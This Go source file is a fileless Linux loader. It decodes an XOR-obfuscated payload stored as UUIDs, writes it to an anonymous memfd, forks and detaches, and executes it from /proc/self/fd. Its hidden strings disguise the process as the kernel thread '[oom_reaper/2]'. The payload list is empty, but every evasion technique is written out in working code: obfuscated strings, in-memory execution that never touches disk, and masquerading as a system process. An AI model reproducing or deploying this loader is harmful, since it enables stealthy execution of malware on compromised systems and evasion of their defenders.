package main

import (
	"fmt"
	"os"

	"github.com/google/uuid"
	"golang.org/x/sys/unix"
)

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

var elfUUIDs = []string{
	// uuids
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

func xorString(input string) string {
	output := make([]byte, len(input))

	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ byte(0x69)
	}

	return string(output)
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

func convertUUIDsToBytes(uuidStrings []string) ([]byte, error) {
	var resultBytes []byte

	for _, s := range uuidStrings {
		parsedUUID, err := uuid.Parse(s)
		if err != nil {
			return nil, err
		}

		byteSlice := parsedUUID[:]
		xoredString := xorString(string(byteSlice))

		resultBytes = append(resultBytes, []byte(xoredString)...)
	}

	return resultBytes, nil
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

func execute(processName string, processPath string) {
	args := []string{processName}
	env := os.Environ()

	if err := unix.Exec(processPath, args, env); err != nil { os.Exit(1) }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

func executeInMemory(elfBytes []byte, processName string, mmapName string) {
	fd, err := unix.MemfdCreate(mmapName, 0)
	if err != nil { os.Exit(1) }

	defer func(fd int) {
		if unix.Close(fd) != nil { os.Exit(1) }
	}(fd)

	_, err = unix.Write(fd, elfBytes)
	if err != nil { os.Exit(1) }

	pid, _, errNo := unix.Syscall(unix.SYS_FORK, 0, 0, 0)
	if errNo != 0 || pid > 0 { os.Exit(1) }

	_, err = unix.Setsid()
	if err != nil { os.Exit(1) }

	procPath := fmt.Sprintf(
		xorString(string([]byte{0x46, 0x19, 0x1b, 0x06, 0x0a, 0x46, 0x1a, 0x0c, 0x05, 0x0f, 0x46, 0x0f, 0x0d, 0x46, 0x4c, 0x0d})),
		fd,
	)
	execute(processName, procPath)
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

func main() {
	elfBytes, err := convertUUIDsToBytes(elfUUIDs)

	if err == nil {
		executeInMemory(
			elfBytes,
			xorString(string([]byte{0x32, 0x06, 0x06, 0x04, 0x36, 0x1b, 0x0c, 0x08, 0x19, 0x0c, 0x1b, 0x46, 0x5b, 0x34})),
			xorString(string([]byte{0x06, 0x06, 0x04, 0x36, 0x1b, 0x0c, 0x08, 0x19, 0x0c, 0x1b})),
		)
	}
}
